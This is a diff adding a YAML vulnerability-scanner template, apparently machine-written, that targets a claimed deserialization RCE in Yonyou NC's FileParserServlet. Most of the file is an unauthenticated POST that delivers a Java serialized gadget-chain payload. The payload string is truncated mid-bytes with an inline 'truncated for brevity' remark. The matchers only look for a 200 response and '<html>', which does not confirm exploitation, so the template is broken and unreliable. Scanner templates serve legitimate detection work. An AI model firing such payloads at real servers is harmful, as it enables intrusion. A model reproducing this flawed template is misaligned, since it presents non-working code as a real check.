@@ -1,0 +1,41 @@
+id: yonyou-nc-fileparser-rce
+info:
+  name: Yonyou NC FileParserServlet Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a deserialization vulnerability in Yonyou NC Cloud's FileParserServlet API. Exploiting this, attackers can execute commands or gain control over the web server.
+  tags: rce, deserialization
+  reference:
+    - https://hc.yonyou.com/product.php?id=4
+  classification:
+    cve-id: ""
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+
+variables:
+  payload: "\xAC\xED\x00\x05sr\x00\x11java.util.HashSet\xBA\x44\x85\x95\x96\xB8\xB7\x34\x03\x00\x00xpw\x0C\x00\x00\x01?@\x00\x00\x00\x00\x01sr\x00\x34org.apache.commons.collections.keyvalue.TiedMapEntry\x8A\xAD\xD2\x9B\x39\xC1\x1F\xDB\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapq~\x00~pst\x00\x03foo... (truncated for brevity)"
+
+http:
+  - raw:
+      - |
+        POST /service/~uapss/nc.search.file.parser.FileParserServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        Content-Length: {{len(payload)}}
+
+        {{payload}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<html>"
+      - type: regex
+        part: body
+        regex:
+          - "<html>.*?"
